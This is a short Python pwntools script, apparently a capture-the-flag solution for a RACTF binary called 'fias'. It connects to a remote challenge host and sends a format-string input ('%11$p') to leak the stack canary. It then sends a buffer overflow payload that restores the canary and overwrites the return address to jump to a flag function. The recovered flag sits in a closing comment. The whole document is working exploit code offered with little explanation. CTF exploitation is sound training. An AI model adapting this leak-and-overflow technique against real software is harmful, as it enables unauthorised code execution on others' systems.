from pwn import *

r = remote('95.216.233.106', 17496)
#r = process('./fias')

r.recvuntil('name?')

# canary @ offset #11
r.sendline('%11$p')
r.recvuntil('you, ')
leak = int(r.recvline().strip().replace('!',''),16)

log.info('Canary leak: {}'.format(hex(leak)))

offset = 25 # payload until canary overwrite
flag_addr = 0x80491d2

payload = ""
payload += "A"*offset
payload += p32(leak)
payload += "A"*12 # offset til return address
payload += p32(flag_addr)

r.recvuntil('canary?')
r.sendline(payload)

r.interactive()

# ractf{St4ck_C4n4ry_FuN!}
